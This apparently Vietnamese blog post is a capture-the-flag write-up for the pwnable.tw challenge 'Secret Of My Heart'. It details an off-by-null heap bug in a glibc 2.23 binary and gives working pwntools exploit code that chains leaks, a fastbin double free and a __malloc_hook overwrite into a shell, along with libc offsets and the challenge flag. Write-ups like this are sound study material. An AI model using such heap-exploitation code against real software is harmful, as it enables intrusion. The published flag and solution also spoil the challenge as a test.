+++
title = 'Pwnable.tw - Secret Of My Heart'
date = 2026-09-21T16:03:49+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Secret Of My Heart

`nc chall.pwnable.tw 10302`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Secret Of My Heart/secret_of_my_heart_patched
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
FORTIFY:    Enabled
```

libc đi kèm glibc 2.23. Symbol đo được: `system = 0x45390`, `main_arena = 0x3c3b20`, `__malloc_hook = 0x3c3b10`, `__free_hook = 0x3c57a8`; one_gadget ứng viên `0x45216` (`rax==NULL`), `0x4526a` (`[rsp+0x30]==NULL`), `0xef6c4` (`[rsp+0x50]==NULL`), `0xf0567`.

Full RELRO nên không GOT hijack, PIE nên mọi địa chỉ phải leak.

`init()` (`sub_B60`) `mmap` một page RW (0x1000) tại `rand() & 0xFFFFF000` và lưu base vào global `unk_202018`. Page này chứa mảng 100 node, mỗi node 48 bytes:

```c
struct node { size_t size;        // +0x00
              char   name[32];    // +0x08
              size_t secret;      // +0x28  (con trỏ chunk malloc / NULL = slot trống)
};
```

Menu:

- `1` Add: tìm slot trống đầu tiên, đọc `size` (`atoi`), từ chối `> 0x100`, rồi `node->size = size`, đọc `name` (<= 32 bytes), `node->secret = malloc(size)`, đọc `secret` (<= `size` bytes), `*(secret + nread) = 0`
- `2` Show: in `Size: %lu`, `Name: %s`, `Secret: %s`
- `3` Delete: zero node, `free(node->secret)`, zero con trỏ secret
- `4` Exit
- `4869` ẩn (`sub_E34`): `printf("Your secret : %p\n", mmap_base)` rồi **`exit(0)`** - leak mmap một lần rồi chết

#### Bug - off-by-null do NUL nối thêm

`ADD` luôn chạy `*(secret + nread) = 0` với `nread` là số byte `read_input` trả về.

Nếu `nread == size` (gửi đúng `size` byte không có newline), NUL rơi vào `secret + size`, tức một byte quá kích thước **yêu cầu**. glibc làm tròn: `chunk = request2size(size)`, vùng user là `chunk+0x10`. NUL rơi vào offset `chunk + 0x10 + size`. Với request thoả `request2size(n) == n + 8` (tức `n ≡ 8 (mod 16)`, ví dụ `0x18`, `0xf8`), đó đúng là **`chunk + chunk_size + 8` = byte thấp của size chunk kế tiếp** - xoá `PREV_INUSE` và hạ size (ví dụ `0x111 → 0x100`).

Nếu byte cuối gửi đi là newline thì `read_input` ghi `\0` tại `nread-1`, off-by-null không kích hoạt. Phải `p.send` đúng `size` byte thô, không bao giờ `sendline`.

Kết hợp với mẹo **dùng lại chunk cũ từ fastbin** (chunk được `malloc` lại từ fastbin giữ nguyên header, `malloc` không set lại), ta đặt được NUL đó vào header của một chunk **đã nằm trong bin**. Đó là toàn bộ primitive.

Lưu ý: hàng xóm còn in-use sẽ tự set lại byte size khi nó được `malloc` (`set_head(p, size|PREV_INUSE)`), nên nạn nhân bị nulled bắt buộc phải đã được free hoặc đã được malloc phục vụ.

### 2. Khai thác

Đường đi: leak libc qua unsorted bin → fastbin double free → `__malloc_hook = one_gadget`.

#### Stage 1 - leak heap base

`show` in `Name: %s`. Nếu buffer name được đổ đúng 32 byte không newline thì nó **không NUL-terminate**, nên `%s` đi tiếp sang trường `secret` của node - một con trỏ heap.

```py
heap = u64(recv(6).ljust(8, b'\0')) - 0x10
```

#### Stage 2 - dựng vùng chồng nhau

```py
add(24,  'A'*32, 'DD')                          # 0 -> cửa sổ leak heap, chunk0 0x20
add(225, 'dd',  p64(0)*2 + p64(0)+p64(0x21)+p64(heap+0x110)+p64(0)
                + p64(0)+p64(0x21)+p64(0)+p64(heap+0x110))   # 1 fake FD/BK
add(24,  'DD', '2222')                          # 2 chunk2 0x20
add(256, 'DD', b'\0'*0xf0 + p64(0) + p64(0x41))  # 3 chunk3 0x110
add(30,  'dd', '4444')                          # 4 guard
delete(2)
add(24,  'DD', p64(heap+0x60) + p64(heap+0x40) + p64(0x110))  # 2 writer off-by-null
delete(1)
delete(2)
```

Chunk writer (dùng lại chunk2 từ fastbin) ghi `FD`/`BK` giả vào vùng chunk3 và set `prev_size` của chunk3; lần secret cuối gửi đủ 24 byte thô (byte cuối là `\x10`) zero byte thấp size của chunk3 (`0x111 → 0x100`, mất `PREV_INUSE`). Free chunk0/chunk1 sau đó consolidate xuyên qua chunk3, tạo ra một vùng free chồng nhau: `secret` của một node còn sống vẫn trỏ **vào trong** chunk free đã gộp.

#### Stage 3 - leak libc

```py
payload = p64(heap+0x70)+p64(heap+0x50) + p64(0)*2 + p64(0)+p64(0x21)+p64(heap+0x20)+p64(0) \
        + p64(0)+p64(0x21)+p64(0)+p64(heap+0x20)
add(256, 'dd', payload)                        # 1
add(24,  'DD', b'A'*16 + p64(0x110))           # 2
delete(3)                                       # free chunk quá cỡ -> unsorted
show(1)   # Secret: <fd thô của chunk đã free> = main_arena + 0x58
```

Đo được `leak & 0xfff == 0x3b78` → `libc_base = leak - 0x3c3b78`.

#### Stage 4 - fastbin double free → `__malloc_hook - 0x23`

```py
add(104,'DD','ndd'); add(104,'ndd','123')      # hai chunk 0x70 cắt từ vùng chồng
delete(3); delete(5); delete(1)                # fastbins[0x70] = A -> B -> A
add(104,'dd', p64(libc.sym['__malloc_hook']-0x23))   # hồi sinh A, ghi fd = fake chunk
add(104,'dd','1111')                           # pop B
add(104,'ndd','2222')                          # pop A lần nữa -> next = fake chunk
add(104,'DD', b'\0'*0x13 + p64(libc.address + 0xef6c4))
```

Fake chunk tại `__malloc_hook - 0x23` chỉ được chấp nhận nếu qword tại `__malloc_hook - 0x1b` giải mã thành một size fastbin của index 5 (`0x7x`). Đo qua nhiều lần chạy: `0x76`/`0x77`/`0x7a` (mask ra `0x70`/`0x78` → đúng idx 5) - **có sẵn trong tự nhiên nhưng phụ thuộc ASLR**, nên cần vòng retry có giới hạn (8 lần, timeout ngắn, fail nhanh khi byte sai).

Lần `add` cuối gọi `malloc()` khi `__malloc_hook` vẫn là 0, trả về `__malloc_hook - 0x13`, ghi `0x13` byte NUL cộng one_gadget, tức là set `__malloc_hook = one_gadget`. Lần `malloc()` **ngay sau đó** kích hoạt hook → `execve("/bin/sh")` (ràng buộc `[rsp+0x50]==NULL` thoả trong ngữ cảnh lời gọi đó). Lần `free` sau trên chunk double-free chỉ in một cảnh báo *fasttop* của glibc ra stderr, vô hại vì process đã bị thay bằng `/bin/sh`.

#### Các hướng đã loại

- **GOT hijack**: Full RELRO
- **Stack smash**: có canary và mọi lần đọc đều bị giới hạn độ dài
- **UAF theo index**: `delete` zero con trỏ secret của node nên menu không cho đọc node cũ trực tiếp
- **Leak heap đơn giản**: NUL nối thêm bình thường chặn mọi leak `%s`; chỉ off-by-null mới tạo được vùng chồng cho một node sống đọc `fd` của chunk đã free

#### Chạy local

Binary "patched" chính thức không chạy thẳng trong `ld-2.23.so` đi kèm trên kernel hiện đại: một `PT_LOAD` dùng `p_align=0x200000` trong khi `p_offset` không congruent 2MB, loader báo `ELF load command address/offset not properly aligned`. Sửa local bằng cách ghi lại mọi `PT_LOAD.p_align` thành `0x1000` trong một bản copy, rồi chạy:

```bash
./ld-2.23.so --library-path . ./secret_of_my_heart_patched_local
```

```bash
[*] heap  @ 0x5565f6c8a000
[*] libc leak 0x7f4afd79cb78 -> base 0x7f4afd3d9000
[+] attempt 1: shell verified
uid=1000(secret_of_my_heart) gid=1000(secret_of_my_heart) groups=1000(secret_of_my_heart)
FLAG{It_just_4_s3cr3t_on_the_h34p}
```

`FLAG: FLAG{It_just_4_s3cr3t_on_the_h34p}`
